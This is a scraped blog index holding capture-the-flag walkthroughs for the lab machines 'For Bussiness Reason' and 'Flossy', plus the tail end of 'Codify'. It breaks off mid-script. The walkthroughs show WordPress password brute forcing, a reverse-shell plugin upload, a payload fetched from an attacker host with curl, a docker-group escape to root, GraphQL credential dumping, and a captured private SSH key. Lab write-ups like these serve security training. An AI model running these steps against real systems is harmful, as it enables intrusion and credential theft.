forever inet6 ::1/128 scope host valid_lft forever preferred_lft forever2: eth0: mtu 1500 qdisc mq state UP group default qlen 1000 link/ether 00:50:56:b9:1a:06 brd ff:ff:ff:ff:ff:ff altname enp3s0 altname ens160 inet 10.10.11.239/23 brd 10.10.11.255 scope global eth0 valid_lft forever preferred_lft forever inet6 dead:beef::250:56ff:feb9:1a06/64 scope global dynamic mngtmpaddr valid_lft 86399sec preferred_lft 14399sec inet6 fe80::250:56ff:feb9:1a06/64 scope link valid_lft forever preferred_lft forever3: docker0: mtu 1500 qdisc noqueue state DOWN group default link/ether 02:42:11:8b:4e:ad brd ff:ff:ff:ff:ff:ff inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0 valid_lft forever preferred_lft forever4: br-030a38808dbf: mtu 1500 qdisc noqueue state DOWN group default link/ether 02:42:35:d9:ff:9f brd ff:ff:ff:ff:ff:ff inet 172.18.0.1/16 brd 172.18.255.255 scope global br-030a38808dbf valid_lft forever preferred_lft forever5: br-5ab86a4e40d0: mtu 1500 qdisc noqueue state UP group default link/ether 02:42:0e:aa:1b:ee brd ff:ff:ff:ff:ff:ff inet 172.19.0.1/16 brd 172.19.255.255 scope global br-5ab86a4e40d0 valid_lft forever preferred_lft forever inet6 fe80::42:eff:feaa:1bee/64 scope link valid_lft forever preferred_lft forever7: veth1ecf062@if6: mtu 1500 qdisc noqueue master br-5ab86a4e40d0 state UP group default link/ether a2:1c:d7:02:29:1e brd ff:ff:ff:ff:ff:ff link-netnsid 0 inet6 fe80::a01c:d7ff:fe02:291e/64 scope link valid_lft forever preferred_lft foreverroot@codify:~# hostnamecodifyroot@codify:~# whoamirootroot@codify:~# iduid=0(root) gid=0(root) groups=0(root)root@codify:~# cat root.txt6e8be6c12de4711d2e1669c8d16c7d21root@codify:~#```{: .nolineno}Now I am root !!> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "For Bussiness Reason", "url": "/posts/For-Bussiness-Reason/", "categories": "TryHackMe", "tags": "Chisel, Pivoting, Wordpress, Docker, PrivEsc", "date": "2023-11-03 00:00:00 +0530", "snippet": "## Description â¤µï¸This machine is *For Bussiness Reasons* , It is from TryHackMe Platform and categorized as Medium machine . This Machine is based on Pivoting .## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kal...", "content": "## Description â¤µï¸This machine is *For Bussiness Reasons* , It is from TryHackMe Platform and categorized as Medium machine . This Machine is based on Pivoting .## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Tryhackme/For_Bussiness_Reasons]â””â”€$ sudo nmap -sC -sV -p- -T4 -oN Nmap_Result.txt 10.10.61.57[sudo] password for kali: Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-03 21:22 ISTNmap scan report for 10.10.61.57Host is up (0.21s latency).Not shown: 65531 filtered tcp ports (no-response)PORT STATE SERVICE VERSION22/tcp closed ssh80/tcp open http Apache httpd 2.4.38 ((Debian))| http-robots.txt: 1 disallowed entry |_/wp-admin/|_http-generator: WordPress 5.4.2|_http-title: MilkCo Test/POC site &#8211; Just another WordPress site|_http-server-header: Apache/2.4.38 (Debian)2377/tcp closed swarm7946/tcp closed unknown```{: .nolineno}## Web Enumeration â¤µï¸I loaded the port 80 and I got a wordpress site so I immediatly used the WPScan Tool for it â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Tryhackme/For_Bussiness_Reasons]â””â”€$ wpscan --url http://10.10.61.57/ -e u,p,t_______________________________________________________________ __ _______ _____ \\ \\ / / __ \\ / ____| \\ \\ /\\ / /| |__) | (___ ___ __ _ _ __ Â® \\ \\/ \\/ / | ___/ \\___ \\ / __|/ _` | '_ \\ \\ /\\ / | | ____) | (__| (_| | | | | \\/ \\/ |_| |_____/ \\___|\\__,_|_| |_| 'WordPress Security Scanner by the WPScan Team Version 3.8.25 @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart_______________________________________________________________[i] Updating the Database ...[i] Update completed.[+] URL: http://10.10.61.57/ [10.10.61.57][+] Started: Fri Nov 3 21:24:12 2023Interesting Finding(s):[+] Headers | Interesting Entries: | - Server: Apache/2.4.38 (Debian) | - X-Powered-By: PHP/7.2.34 | Found By: Headers (Passive Detection) | Confidence: 100%[+] robots.txt found: http://10.10.61.57/robots.txt | Interesting Entries: | - /wp-admin/ | - /wp-admin/admin-ajax.php | Found By: Robots Txt (Aggressive Detection) | Confidence: 100%[+] XML-RPC seems to be enabled: http://10.10.61.57/xmlrpc.php | Found By: Direct Access (Aggressive Detection) | Confidence: 100% | References: | - http://codex.wordpress.org/XML-RPC_Pingback_API | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/ | - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/ | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/ | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/[+] WordPress readme found: http://10.10.61.57/readme.html | Found By: Direct Access (Aggressive Detection) | Confidence: 100%[+] The external WP-Cron seems to be enabled: http://10.10.61.57/wp-cron.php | Found By: Direct Access (Aggressive Detection) | Confidence: 60% | References: | - https://www.iplocation.net/defend-wordpress-from-ddos | - https://github.com/wpscanteam/wpscan/issues/1299[+] WordPress version 5.4.2 identified (Insecure, released on 2020-06-10). | Found By: Emoji Settings (Passive Detection) | - http://10.10.61.57/, Match: 'wp-includes\\/js\\/wp-emoji-release.min.js?ver=5.4.2' | Confirmed By: Meta Generator (Passive Detection) | - http://10.10.61.57/, Match: 'WordPress 5.4.2'[i] The main theme could not be detected.[+] Enumerating Most Popular Plugins (via Passive Methods)[i] No plugins Found.[+] Enumerating Most Popular Themes (via Passive and Aggressive Methods)[+] Checking Theme Versions (via Passive and Aggressive Methods)[i] Theme(s) Identified:[+] twentynineteen | Location: http://10.10.61.57/wp-content/themes/twentynineteen/ | Last Updated: 2023-10-23T00:00:00.000Z | Readme: http://10.10.61.57/wp-content/themes/twentynineteen/readme.txt | [!] The version is out of date, the latest version is 2.6 | Style URL: http://10.10.61.57/wp-content/themes/twentynineteen/style.css | Style Name: Twenty Nineteen | Style URI: https://wordpress.org/themes/twentynineteen/ | Description: Our 2019 default theme is designed to show off the power of the block editor. It features custom sty... | Author: the WordPress team | Author URI: https://wordpress.org/ | | Found By: Known Locations (Aggressive Detection) | - http://10.10.61.57/wp-content/themes/twentynineteen/, status: 500 | | Version: 1.5 (80% confidence) | Found By: Style (Passive Detection) | - http://10.10.61.57/wp-content/themes/twentynineteen/style.css, Match: 'Version: 1.5'[+] twentyseventeen | Location: http://10.10.61.57/wp-content/themes/twentyseventeen/ | Last Updated: 2023-10-23T00:00:00.000Z | Readme: http://10.10.61.57/wp-content/themes/twentyseventeen/readme.txt | [!] The version is out of date, the latest version is 3.3 | Style URL: http://10.10.61.57/wp-content/themes/twentyseventeen/style.css | Style Name: Twenty Seventeen | Style URI: https://wordpress.org/themes/twentyseventeen/ | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo... | Author: the WordPress team | Author URI: https://wordpress.org/ | | Found By: Known Locations (Aggressive Detection) | - http://10.10.61.57/wp-content/themes/twentyseventeen/, status: 500 | | Version: 2.3 (80% confidence) | Found By: Style (Passive Detection) | - http://10.10.61.57/wp-content/themes/twentyseventeen/style.css, Match: 'Version: 2.3'[+] twentytwenty | Location: http://10.10.61.57/wp-content/themes/twentytwenty/ | Last Updated: 2023-10-23T00:00:00.000Z | Readme: http://10.10.61.57/wp-content/themes/twentytwenty/readme.txt | [!] The version is out of date, the latest version is 2.3 | Style URL: http://10.10.61.57/wp-content/themes/twentytwenty/style.css | Style Name: Twenty Twenty | Style URI: https://wordpress.org/themes/twentytwenty/ | Description: Our default theme for 2020 is designed to take full advantage of the flexibility of the block editor... | Author: the WordPress team | Author URI: https://wordpress.org/ | | Found By: Known Locations (Aggressive Detection) | - http://10.10.61.57/wp-content/themes/twentytwenty/, status: 500 | | Version: 1.2 (80% confidence) | Found By: Style (Passive Detection) | - http://10.10.61.57/wp-content/themes/twentytwenty/style.css, Match: 'Version: 1.2'[+] Enumerating Users (via Passive and Aggressive Methods) Brute Forcing Author IDs - Time: 00:00:00 (0 / 10) 0.00% Brute Forcing Author IDs - Time: 00:00:01 (1 / 10) 10.00% Brute Forcing Author IDs - Time: 00:00:01 (2 / 10) 20.00% Brute Forcing Author IDs - Time: 00:00:01 (3 / 10) 30.00% Brute Forcing Author IDs - Time: 00:00:01 (4 / 10) 40.00% Brute Forcing Author IDs - Time: 00:00:03 (5 / 10) 50.00% Brute Forcing Author IDs - Time: 00:00:03 (8 / 10) 80.00% Brute Forcing Author IDs - Time: 00:00:04 (9 / 10) 90.00% Brute Forcing Author IDs - Time: 00:00:04 (10 / 10) 100.00% Time: 00:00:04[i] User(s) Identified:[+] sysadmin | Found By: Wp Json Api (Aggressive Detection) | - http://10.10.61.57/wp-json/wp/v2/users/?per_page=100&page=1 | Confirmed By: | Rss Generator (Aggressive Detection) | Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Login Error Messages (Aggressive Detection)[!] No WPScan API Token given, as a result vulnerability data has not been output.[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register```{: .nolineno}Now I got a username as sysadmin and with this Tool only I tried to bruteforced the password for wordpress login â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Tryhackme/For_Bussiness_Reasons]â””â”€$ wpscan --url http://10.10.61.57/ -U sysadmin -P /usr/share/wordlists/rockyou.txt _______________________________________________________________ __ _______ _____ \\ \\ / / __ \\ / ____| \\ \\ /\\ / /| |__) | (___ ___ __ _ _ __ Â® \\ \\/ \\/ / | ___/ \\___ \\ / __|/ _` | '_ \\ \\ /\\ / | | ____) | (__| (_| | | | | \\/ \\/ |_| |_____/ \\___|\\__,_|_| |_| 'WordPress Security Scanner by the WPScan Team Version 3.8.25 Sponsored by Automattic - https://automattic.com/ @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart_______________________________________________________________[+] URL: http://10.10.61.57/ [10.10.61.57][+] Started: Fri Nov 3 21:31:46 2023......[i] No Config Backups Found.[+] Performing password attack on Xmlrpc against 1 user/s[SUCCESS] - sysadmin / milkshake Trying sysadmin / kenzie Time: 00:06:25 (1665 / 14346057) 0.01% ETA: ??:??:??[!] Valid Combinations Found: | Username: sysadmin, Password: milkshake```{: .nolineno}I have the credentials now so lets login into the wordpress site and upload the reverse shell in Themes or Plugins php file and update that files and load the URLs to gain a reverse shell â†’![Untitled](For%20Bussiness%20Reason/Untitled%201.png)I loaded this plugin URL to get the reverse shell response â†’```bashhttps://10.10.128.95/wp-content/plugins/hello.php```{: .nolineno}After getting the shell I accessed the wp-config.php file that contains the database credentails â†’```bashwp-config.php >>// ** MySQL settings - You can get this info from your web host ** ///** The name of the database for WordPress */define( 'DB_NAME', 'wpdb');/** MySQL database username */define( 'DB_USER', 'wpdbuser');/** MySQL database password */define( 'DB_PASSWORD', 'Ceixahz5');/** MySQL hostname */define( 'DB_HOST', 'db');/** Database Charset to use in creating database tables. */define( 'DB_CHARSET', 'utf8');/** The Database Collate type. Do not change this if in doubt. */define( 'DB_COLLATE', '');```{: .nolineno}As I tried but no commands are working so I tried to see the IP addresses with this command â†’```bashwww-data@8f5f60739296:/$ hostname -Ihostname -I10.0.0.3 172.18.0.3 10.255.0.4 www-data@8f5f60739296:/$```{: .nolineno}I got 3 IP addresses so lets transfer the nmap to see what services are running in this IPs an I am inside a container so with curl Tool.```bashwww-data@8f5f60739296:/tmp$ curl http://10.8.83.156:80/nmap -o nmapcurl http://10.8.83.156:80/nmap -o nmap % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed100 2775k 100 2775k 0 0 1213k 0 0:00:02 0:00:02 --:--:-- 1212kwww-data@8f5f60739296:/tmp$ ls -alls -altotal 2788drwxrwxrwt 1 root root 4096 Nov 5 09:17 .drwxr-xr-x 1 root root 4096 Nov 5 08:41 ..-rw-rw-rw- 1 www-data www-data 2842096 Nov 5 09:17 nmapdrwxr-xr-x 5 root root 4096 Nov 19 2020 pearwww-data@8f5f60739296:/tmp$ chmod +x nmapchmod +x nmapwww-data@8f5f60739296:/tmp$```{: .nolineno}I scan the network `172.18.0.3/24` and I got the IP `172.18.0.1` which have port 80,22 open so I used chisel Tool to do the pivoting â†’![Untitled](For%20Bussiness%20Reason/Untitled%202.png)```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Tryhackme/For_Bussiness_Reasons]â””â”€$ sudo ssh sysadmin@127.0.0.1 -p 1234[sudo] password for kali: The authenticity of host '[127.0.0.1]:1234 ([127.0.0.1]:1234)' can not be established.ED25519 key fingerprint is SHA256:U14271OTfB1vLbhGF52YlyhN4QwdxK/ukXix+l83+iI.This key is not known by any other names.Are you sure you want to continue connecting (yes/no/[fingerprint])? yesWarning: Permanently added '[127.0.0.1]:1234' (ED25519) to the list of known hosts.sysadmin@127.0.0.1s password: Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-62-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage263 packages can be updated.181 updates are security updates.Last login: Sat Nov 21 15:30:19 2020sysadmin@ubuntu:~$ whoamisysadminsysadmin@ubuntu:~$ iduid=1000(sysadmin) gid=1000(sysadmin) groups=1000(sysadmin),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare),122(docker)sysadmin@ubuntu:~$ ls -altotal 40drwxr-xr-x 4 sysadmin sysadmin 4096 Nov 21 2020 .drwxr-xr-x 3 root root 4096 Aug 8 2020 ..-rw-r--r-- 1 sysadmin sysadmin 220 Aug 8 2020 .bash_logout-rw-r--r-- 1 sysadmin sysadmin 3771 Aug 8 2020 .bashrcdrwx------ 2 sysadmin sysadmin 4096 Aug 8 2020 .cache-rw------- 1 sysadmin sysadmin 9 Aug 8 2020 flag1.txtdrwxrwxr-x 2 sysadmin sysadmin 4096 Aug 8 2020 .nano-rw-r--r-- 1 sysadmin sysadmin 655 Aug 8 2020 .profile-rw-rw-r-- 1 sysadmin sysadmin 66 Aug 8 2020 .selected_editor-rw-r--r-- 1 sysadmin sysadmin 0 Aug 8 2020 .sudo_as_admin_successful-rw------- 1 sysadmin sysadmin 768 Aug 8 2020 .viminfosysadmin@ubuntu:~$ cat flag1.txtFLAGFLAGFLAGsysadmin@ubuntu:~$```{: .nolineno}Now for root access I see the id groups and I noticed docker and I checked the images and I exploit that and got the root â†’```bashsysadmin@ubuntu:/tmp$ iduid=1000(sysadmin) gid=1000(sysadmin) groups=1000(sysadmin),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare),122(docker)sysadmin@ubuntu:/tmp$ sysadmin@ubuntu:/tmp$ docker imagesREPOSITORY TAG IMAGE ID CREATED SIZEmysql 5.7 ae0658fdbad5 2 years ago 449MBwordpress latest cfb931188dab 2 years ago 546MBwordpress php7.2-apache 82f0034f8ebe 2 years ago 542MBwordpress d3bd49a68bba 3 years ago 539MBmysql 718a6da099d8 3 years ago 448MBsysadmin@ubuntu:/tmp$ docker run -v /:/mnt --rm -it mysql chroot /mnt shUnable to find image 'mysql:latest' locally^Csysadmin@ubuntu:/tmp$ docker run -v /:/mnt --rm -it wordpress chroot /mnt sh# whoamiroot# iduid=0(root) gid=0(root) groups=0(root)# cd /root# ls -altotal 44drwx------ 4 root root 4096 Nov 21 2020 .drwxr-xr-x 24 root root 4096 Aug 8 2020 ..-rw------- 1 root root 83 Nov 21 2020 .bash_history-rw-r--r-- 1 root root 3106 Oct 22 2015 .bashrcdrwx------ 2 root root 4096 Aug 9 2020 .cachedrwxr-xr-x 2 root root 4096 Aug 8 2020 .nano-rw-r--r-- 1 root root 148 Aug 17 2015 .profile-rw-r--r-- 1 root root 75 Aug 8 2020 .selected_editor-rw------- 1 root root 6209 Nov 21 2020 .viminfo-rw-r--r-- 1 root root 17 Aug 8 2020 root.txt# cat root.txtFLAGFLAGFLAGFLAG#```{: .nolineno}Now I am root !!> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "Flossy", "url": "/posts/Flossy/", "categories": "HackMyVM", "tags": "Graphql, Network_Reset, tty, PrivEsc", "date": "2023-10-31 00:00:00 +0530", "snippet": "## Description â¤µï¸This machine is Flossy , It is from HackMyVM Platform and categorized as Medium machine . I learned about the tty function in detailed in this machine.## Port Scan Results â¤µï¸![Unti...", "content": "## Description â¤µï¸This machine is Flossy , It is from HackMyVM Platform and categorized as Medium machine . I learned about the tty function in detailed in this machine.## Port Scan Results â¤µï¸![Untitled](Flossy/Untitled%201.png)```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HackMyVM/Flossy]â””â”€$ sudo nmap -sC -sV -p- -T4 -oN Nmap_Result.txt 10.0.2.78Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-31 13:17 ISTNmap scan report for 10.0.2.78Host is up (0.00069s latency).Not shown: 65533 closed tcp ports (reset)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 9.2p1 Debian 2 (protocol 2.0)| ssh-hostkey: | 256 dd:83:da:cb:45:d3:a8:ea:c6:be:19:03:45:76:43:8c (ECDSA)|_ 256 e5:5f:7f:25:aa:c0:18:04:c4:46:98:b3:5d:a5:2b:48 (ED25519)80/tcp open http Node.js Express framework|_http-title: About Rick and MortyMAC Address: 08:00:27:55:5A:AB (Oracle VirtualBox virtual NIC)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel```{: .nolineno}## Web Enumeration â¤µï¸Lets check port 80 â†’![Untitled](Flossy/Untitled%202.png)Now from burpsuite I get the response as this â†’![Untitled](Flossy/Untitled%203.png)> I noticed graphql so I searched about it as pentest on web â†’[https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/graphql](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/graphql){: .prompt-tip }```json\"query\":\"{__schema{types{name,fields{name,args{name,description,type{name,kind,ofType{name, kind}}}}}}}\"```{: .nolineno}![Untitled](Flossy/Untitled%204.png)I found the key values as used for character with its id and getting name, status, gender for that , so like wise I modified the input for username and password access through users id parameter like this â†’```json{\"query\":\"{ users(id:9) { username password } }\"}```{: .nolineno}![Untitled](Flossy/Untitled%205.png)```json\"username\":\"malo\"\"password\":\"8YdsA3CkiWx968\"```{: .nolineno}## SSH SHELL â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HackMyVM/Flossy]â””â”€$ ssh malo@10.0.2.78The authenticity of host '10.0.2.78 (10.0.2.78)' can not be established.ED25519 key fingerprint is SHA256:TCA/ssXFaEc0sOJl0lvYyqTVTrCpkF0wQfyj5mJsALc.This key is not known by any other names.Are you sure you want to continue connecting (yes/no/[fingerprint])? yesWarning: Permanently added '10.0.2.78' (ED25519) to the list of known hosts.malo@10.0.2.78s password: Linux flossy 6.1.0-10-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.37-1 (2023-07-03) x86_64The programs included with the Debian GNU/Linux system are free software;the exact distribution terms for each program are described in theindividual files in /usr/share/doc/*/copyright.Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extentpermitted by applicable law.[oh-my-zsh] Would you like to update? [Y/n] YUpdating Oh My Zshmaster......â•­â”€malo@flossy ~ â•°â”€$ whoamimaloâ•­â”€malo@flossy ~ â•°â”€$ iduid=1000(malo) gid=1000(malo) groups=1000(malo),100(users)â•­â”€malo@flossy ~ â•°â”€$```{: .nolineno}I checked this `SSHKeySync` from spohie directory files â†’```bashâ•­â”€malo@flossy /home/sophie â•°â”€$ cat SSHKeySync#!/bin/bash# This script must run every minute in pre-prodsend_private_key() { local user_name=\"$1\" local key_path=\"/home/$user_name/.ssh/id_rsa\" local admin_tty=\"/dev/pts/24\" if [ -f \"$key_path\" ]; then if [ -w \"$admin_tty\" ]; then cat \"$key_path\" > \"$admin_tty\" else echo \"Error: Unable to write to $admin_tty\" fi else echo \"Error: The private key for $user_name does not exist.\" fi}while true ; do USER=\"sophie\" echo \"Sending $USER is private key to a high-privileged TTY for quick testing...\" send_private_key \"$USER\" sleep 1mdone```{: .nolineno}According to this if I have to get the ssh keys for sophie I need to be `tty = /dev/pts/24` and must have our own ssh keys through ssh-keygen command like this â†’```bashâ•­â”€malo@flossy ~ â•°â”€$ ssh-keygen Generating public/private rsa key pair.Enter file in which to save the key (/home/malo/.ssh/id_rsa): /home/malo/.ssh/id_rsa already exists.Overwrite (y/n)? yEnter passphrase (empty for no passphrase): Enter same passphrase again: Your identification has been saved in /home/malo/.ssh/id_rsaYour public key has been saved in /home/malo/.ssh/id_rsa.pubThe key fingerprint is:SHA256:fvguqOKjAPP42x94+ve9cM04tXpQjG+1BdyWtVTHeA0 malo@flossyThe key is randomart image is:+---[RSA 3072]----+| .E*O|| =.O|| o = || . o o||o S o..o||.+ . . . .=oo ||o . . o.o o +o+ ||..o. o..oo + o. ||.o++++o. ++ +o |+----[SHA256]-----+â•­â”€malo@flossy ~ â•°â”€$ cd .sshâ•­â”€malo@flossy ~/.ssh â•°â”€$ mv id_rsa.pub authorized_keys```{: .nolineno}Now I checked my tty status where I am I get this â†’```bashâ•­â”€malo@flossy ~/.ssh â•°â”€$ tty/dev/pts/0```{: .nolineno}Now I ssh it on value 0 and the tty value also come as 1 â†’```bashâ•­â”€malo@flossy ~ â•°â”€$ ssh 0Linux flossy 6.1.0-10-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.37-1 (2023-07-03) x86_64The programs included with the Debian GNU/Linux system are free software;the exact distribution terms for each program are described in theindividual files in /usr/share/doc/*/copyright.Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extentpermitted by applicable law.Last login: Tue Oct 31 10:28:01 2023 from 127.0.0.1â•­â”€malo@flossy ~ â•°â”€$ tty/dev/pts/1```{: .nolineno}so like wise I tried it till it became `/dev/pts/24` and I waited for few secands and I get the private keys like this â†’```bashâ•­â”€malo@flossy ~ â•°â”€$ tty/dev/pts/24â•­â”€malo@flossy ~ â•°â”€$ -----BEGIN OPENSSH PRIVATE KEY-----b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcnNhAAAAAwEAAQAAAYEAlfKkxqQRaakvwCsUmqbXFm0cdI4zkp9UcejsdWhZKbuq+9l8l6tPNic4xIoq1S++4Xlj8acA9oJG3yFSgwsBNIaqAJq1zxSpDnzBBpSIqZk2OmkHw8BNBth98D3RKB5d1SOq0pNiBk4dtQ/QGgd7S30oHNlqF524Nf4jCJxkMLUk527Ga+cjPmM068DtOZMFxfY/gWrnjk44tigt4QP4hkmMEtshPps4SF6dm544FYghYs+rgCH9tx+DfUl7ZFLnBviGL9RzN7yQLUV/BPFod8SPihd/s7bSMGfBvopCWFcueL0xAd22Q7CU1jSg4W6+aSfbCSRND3iktz/SsWN2/RR2H+MQxB11J5qvLFxq291B0Znoi5sgARZUihDihjhPyVL0dco2wrQtL6ey2BedRtX24GejoGuvdqd3/qHi5R35sZ4zcUCEldNwq0aC/b3EU/cmu16nmDuhJZpT2ILj35crng8Faf39ZAeIRFKsyfibnRMxoBwLkWWyEs8h2APLAAAFiGZJHbxmSR28AAAAB3NzaC1yc2EAAAGBAJXypMakEWmpL8ArFJqm1xZtHHSOM5KfVHHo7HVoWSm7qvvZfJerTzYnOMSKKtUvvuF5Y/GnAPaCRt8hUoMLATSGqgCatc8UqQ58wQaUiKmZNjppB8PATQbYffA90SgeXdUjqtKTYgZOHbUP0BoHe0t9KBzZaheduDX+IwicZDC1JOduxmvnIz5jNOvA7TmTBcX2P4Fq545OOLYoLeED+IZJjBLbIT6bOEhenZueOBWIIWLPq4Ah/bcfg31Je2RS5wb4hi/Ucze8kC1FfwTxaHfEj4oXf7O20jBnwb6KQlhXLni9MQHdtkOwlNY0oOFuvmkn2wkkTQ94pLc/0rFjdv0Udh/jEMQddSearyxcatvdQdGZ6IubIAEWVIoQ4oY4T8lS9HXKNsK0LS+nstgXnUbV9uBno6Brr3and/6h4uUd+bGeM3FAhJXTcKtGgv29xFP3Jrtep5g7oSWaU9iC49+XK54PBWn9/WQHiERSrMn4m50TMaAcC5FlshLPIdgDywAAAAMBAAEAAAGAOMcNhJfYbhFdnt7RKPQWyoubNDkqJxFEqPNBIf3WkTpZ9o42Irn/vuogES+eI2Y2WWsdIIITl8PhsRiNhUgz9x8snRj30ccpcm5jqqmwi8OTaI+fnIwivn5YRZEqsw24iv2774tWGTwX/JjVvB1sHrvv5eifRvz2JR+rRVXujBDzPdzQrkfxrOxkvAYr7VqR25EwH8GKl3Rf/f19zc+ymaqcqwEld+7PY3vMIwJIi0KmHaOz9Usppl7864JZAjZvZu+C1hzouj+hXRFLlUZJGIw+N50C+vmaI0Py4ZDwubwisr+QdPsihk7GJChCzfs00X5BJ54mUf8o8ka7kjCmoh8niXsOtRGTrThX4U6dy29Fj7q/NHXC9JG8n4j92V3sQJir4b7EKY9C4dwGM2J/lT41DNluj1iAFj+FZgq/a1BOiIGAgLOloJW9NtPN2MrdqBVbMaP7C2MRpybCSzVb7MOBk4ySynjk9xHoTgLLzQHHhlOBzua5zfiVrfDLt4v5AAAAwEAL+tJoildf450QGsY3elLbx9TaUw4uW9bH7YfZ+68eV+TbW5bAzQLV6s1g3Lru1oppVSUo2G4uPNyAVHVqU5YNKp0W4f2LfRrwYabEnzGyt5BGWBXHrRl16X2KKk3cuJ/Lld0wY5aJiDZE8AL8Hkt6IeReFhCR3CMDOjoLasTnS0k+CLRG5/E22bqy5Y/r07eElt1ptdZXUnbILi9/TQn0BgMJNbACry7TLYWf11SAW+HlDqvHIait9JJZVvdsCwAAAMEAxWqZ9pKSh1S0riAyKoQVkuZ5OW27JYZKmJO1MrkwIWO+UXpXyrWCdh2grXLDmli1R688VE07xWg25ygtNR9w2dUhNYutFu7Mj8IDEVQ3MkQDozdFTNZUmx5cNUKADIbCt88Uwvsw6asQKWuQeyXivLPVkTLIVp3MD5e8t2jlt8Bprc52xQ3DG1HqgavwP6KSSDkirflegl/I74MSEAyYJ24JqWDJwwOYquYGdU5z4TsMm87m9dITdAYtl3fTvXpzAAAAwQDCce6pgoKJiodd1qNdFQzMMBZeP0SqnWUHvfNJdcKSgg8wJVEC1nupH8JZNUAuXQSUS0y1vqpVMgtvB/ui4HBiyWFsHLg181vhGy880UHM28Q6oJt8Pi9yJ7iwMMKws5eoYQlV0pvQsh+I+4dhK/v09DHLQ2iPSbaqAxUcRmkhN0VJaK3CMiTLcp06jECr7qKu3wJVsHZf5C36M5H1204Iuah851GpSCbmIZSgSd0BNvQQ2/k5tWjbk/VAmeosQ0kAAAANc29waGllQGZsb3NzeQECAwQFBg==-----END OPENSSH PRIVATE KEY-----```{: .nolineno}Now I changed its `id_rsa` file permission as 600 and tried to login as sophie user â†’```bashâ•­â”€malo@flossy /home/sophie â•°â”€$ ssh -i ~/id_rsa sophie@127.0.0.1The authenticity of host '127.0.0.1 (127.0.0.1)' can not be established.ED25519 key fingerprint is SHA256:TCA/ssXFaEc0sOJl0lvYyqTVTrCpkF0wQfyj5mJsALc.This host key is known by the following other names/addresses: ~/.ssh/known_hosts:1: [hashed name]Are you sure you want to continue connecting (yes/no/[fingerprint])? yesWarning: Permanently added '127.0.0.1' (ED25519) to the list of known hosts.Linux flossy 6.1.0-10-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.37-1 (2023-07-03) x86_64The programs included with the Debian GNU/Linux system are free software;the exact distribution terms for each program are described in theindividual files in /usr/share/doc/*/copyright.Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extentpermitted by applicable law.[oh-my-zsh] Would you like to update? [Y/n] n[oh-my-zsh] You can update manually by running `omz update`â•­â”€sophie@flossy ~ â•°â”€$ â•­â”€sophie@flossy ~ â•°â”€$ whoami sophieâ•­â”€sophie@flossy ~ â•°â”€$ iduid=1001(sophie) gid=1001(sophie) groups=1001(sophie),100(users)â•­â”€sophie@flossy ~ â•°â”€$ ls -altotal 232drwxr-xr-x 5 sophie sophie 4096 Oct 31 10:42 .drwxr-xr-x 4 root root 4096 Oct 6 20:49 ..-rw------- 1 root root 370 Oct 10 18:37 .bash_history-rw-r--r-- 1 sophie sophie 220 Oct 6 20:49 .bash_logout-rw-r--r-- 1 sophie sophie 3526 Oct 6 20:49 .bashrcdrwxr-xr-x 3 sophie sophie 4096 Oct 6 20:49 .local-rwxr----- 1 root sophie 962 Oct 6 20:35 networkdrwxr-xr-x 12 sophie sophie 4096 Oct 6 20:55 .oh-my-zsh-rw-r--r-- 1 sophie sophie 807 Oct 6 20:49 .profile-rw-r--r-- 1 sophie sophie 66 Oct 7 10:18 .selected_editordrwx------ 2 sophie sophie 4096 Oct 10 18:36 .ssh-rwxr-xr-x 1 sophie sophie 630 Oct 10 14:23 SSHKeySync-rwx------ 1 sophie sophie 33 Oct 10 17:24 user.txt-rw-r--r-- 1 sophie sophie 51810 Oct 31 10:42 .zcompdump-flossy-5.9-r--r--r-- 1 sophie sophie 119920 Oct 31 10:42 .zcompdump-flossy-5.9.zwc-rw------- 1 sophie sophie 85 Oct 31 10:42 .zsh_history-rw-r--r-- 1 sophie sophie 3890 Oct 6 20:49 .zshrcâ•­â”€sophie@flossy ~ â•°â”€$ cat user.txtFLAG---FLAG---FLAG---FLAGâ•­â”€sophie@flossy ~ â•°â”€$ file networknetwork: Bourne-Again shell script, ASCII text executableâ•­â”€sophie@flossy ~ â•°â”€$ cat network #!/bin/bashconnected_ip(){ connection_type=TCP champ=2 ignores=LISTEN lsof_args=-ni 